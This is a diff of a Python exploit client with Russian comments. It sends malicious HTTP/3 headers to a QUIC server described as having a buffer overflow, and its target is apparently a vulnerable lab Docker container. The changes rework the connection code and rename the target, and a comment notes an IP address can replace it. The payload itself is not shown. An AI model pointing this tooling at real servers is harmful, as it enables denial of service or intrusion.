@@ -19,11 +19,10 @@ class QuicExploitClient:
     async def send_exploit_payload(self, iteration: int):
         try:
             # Создаем соединение
-            async with await QuicConnection.connect(
-                self.host,
-                self.port,
-                configuration=self.configuration
-            ) as connection:
+            connection = QuicConnection(configuration=self.configuration)
+            await connection.connect(self.host, self.port)
+            
+            async with connection:
                 h3_connection = H3Connection(connection)
 
                 # Формируем вредоносные заголовки
@@ -84,5 +83,5 @@ if __name__ == "__main__":
     print("Target: vulnerable QUIC server with buffer overflow in meta tags")
     
     # здесь haCker это имя контейнера Docker, но его можно заменить IP адресом
-    client = QuicExploitClient("haCker", 4433)
+    client = QuicExploitClient("vsQUIC", 4433)
     asyncio.run(client.run_exploit(times=10))
